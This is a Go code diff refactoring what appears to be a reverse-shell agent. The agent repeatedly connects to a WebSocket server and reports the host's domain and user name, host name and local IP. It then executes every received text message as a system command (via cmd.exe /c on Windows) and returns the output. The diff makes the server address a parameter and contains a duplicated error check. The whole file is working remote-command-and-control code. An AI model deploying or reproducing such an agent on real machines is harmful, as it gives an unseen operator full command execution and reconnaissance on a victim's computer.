@@ -13,20 +13,14 @@ import (
 	"time"
 )
 
-func Run() {
-	infiniteConnection()
-}
-
-func infiniteConnection() {
-	server := "ws://localhost:8080/api/agent/shell"
+func Run(server string) {
 	for {
 		connection, err := openWebSocketConnection(server)
 		if err != nil {
 			wait()
 			continue
 		}
-
-		if err = sendAuth(connection); err != nil {
+		if err = identifyItself(connection); err != nil {
 			fmt.Println(err)
 			closeConn(connection)
 			continue
@@ -38,18 +32,14 @@ func infiniteConnection() {
 }
 
 func wait() {
-	waitingSeconds := 30
+	waitingSeconds := 20
 	waiting := time.Duration(waitingSeconds) * time.Second
-	fmt.Printf("WebSocket Session ended. Waiting %d seconds to reestablish connection.\n", waitingSeconds)
+	fmt.Printf("WebSocket Session ended. Waiting %d seconds to reestablish the session.\n", waitingSeconds)
 	time.Sleep(waiting)
 }
 
 func handleMessages(connection *websocket.Conn) {
-	workingDirectory, err := os.UserHomeDir()
-	if err != nil {
-		workingDirectory = "C:\\"
-		fmt.Printf("Cannot resolve home directory, falling back to %s", workingDirectory)
-	}
+	workingDirectory := "C:\\"
 	for {
 		messageType, bytes, err := connection.ReadMessage()
 		if err != nil {
@@ -58,29 +48,35 @@ func handleMessages(connection *websocket.Conn) {
 		}
 		switch messageType {
 		case websocket.TextMessage:
-			command := strings.TrimSpace(string(bytes))
-			workingDirectory = resolveWorkingDirectory(workingDirectory, command)
-			commandResult, err := executeCommand(workingDirectory, command)
-			if err != nil {
-				fmt.Println(err)
-			}
-			sendResult(connection, commandResult)
+			workingDirectory = handleTextMessage(connection, bytes, workingDirectory)
 		case websocket.CloseMessage:
 			fmt.Printf("Close frame with message: %s\n", string(bytes))
+			closeConn(connection)
 			break
 		default:
 			fmt.Printf("Not supported WS frame of type %d\n", messageType)
-			break
 		}
 	}
 }
 
-func sendResult(connection *websocket.Conn, result string) {
-	fmt.Printf("Sending command result: %s...\n", result)
-	err := connection.WriteMessage(websocket.TextMessage, []byte(result))
+func handleTextMessage(
+	connection *websocket.Conn,
+	message []byte,
+	workingDirectory string,
+) string {
+	command := strings.TrimSpace(string(message))
+	workingDirectory = resolveWorkingDirectory(workingDirectory, command)
+	parsedCommand := parseCommand(command)
+	commandResult, err := executeCommand(workingDirectory, parsedCommand)
 	if err != nil {
-		fmt.Printf("Could not send message: %s\n", result[:20])
+		fmt.Println(err)
 	}
+	fmt.Printf("Sending command result: %s...\n", commandResult)
+	err = connection.WriteMessage(websocket.TextMessage, []byte(commandResult))
+	if err != nil {
+		fmt.Printf("Could not send message: %s\n", commandResult)
+	}
+	return workingDirectory
 }
 
 func resolveWorkingDirectory(
@@ -104,9 +100,8 @@ func resolveWorkingDirectory(
 	return filepath.Join(currentWorkingDirectory, cdPath)
 }
 
-func executeCommand(workingDirectory string, command string) (string, error) {
-	fmt.Printf("Executing command: %s %s\n", workingDirectory, command)
-	parsedCommand := parseCommand(command)
+func executeCommand(workingDirectory string, parsedCommand []string) (string, error) {
+	fmt.Printf("Executing command: %s %s\n", workingDirectory, strings.Join(parsedCommand, " "))
 	cmd := exec.Command(parsedCommand[0], parsedCommand[1:]...)
 	cmd.Dir = workingDirectory
 	output, err := cmd.CombinedOutput()
@@ -122,12 +117,18 @@ func parseCommand(command string) []string {
 	if command == "" {
 		return nil
 	}
+
+	result := make([]string, 0)
+
+	if runtime.GOOS == "windows" {
+		result = append(result, "cmd.exe")
+		result = append(result, "/c")
+	}
+
 	from := 0
 	inQuotes := false
 	skip := false
-	result := make([]string, 0)
-	result = append(result, "cmd.exe")
-	result = append(result, "/c")
+
 	length := len(command)
 	for i := 0; i < length; i++ {
 		ch := command[i]
@@ -179,8 +180,8 @@ func openWebSocketConnection(server string) (*websocket.Conn, error) {
 	return conn, nil
 }
 
-func sendAuth(connection *websocket.Conn) error {
-	err := connection.WriteJSON(newGreeting())
+func identifyItself(connection *websocket.Conn) error {
+	err := connection.WriteJSON(newAgent())
 	if err != nil {
 		return err
 	}
@@ -193,18 +194,21 @@ type Agent struct {
 	LocalIp  string `json:"localIp"`
 }
 
-func newGreeting() Agent {
+func newAgent() Agent {
 	domainAndUserName, err := getDomainAndUserName()
 	if err != nil {
-		fmt.Printf("Cannot get domain and user name. %s", err.Error())
+		fmt.Println(err.Error())
+	}
+	if err != nil {
+		fmt.Println(err.Error())
 	}
 	name, err := getHostName()
 	if err != nil {
-		fmt.Printf("Cannot get host name. %s", err.Error())
+		fmt.Println(err.Error())
 	}
 	localIp, err := getLocalIp()
 	if err != nil {
-		fmt.Printf("Cannot get local IP. %s", err.Error())
+		fmt.Println(err.Error())
 	}
 	return Agent{
 		Name:     domainAndUserName,
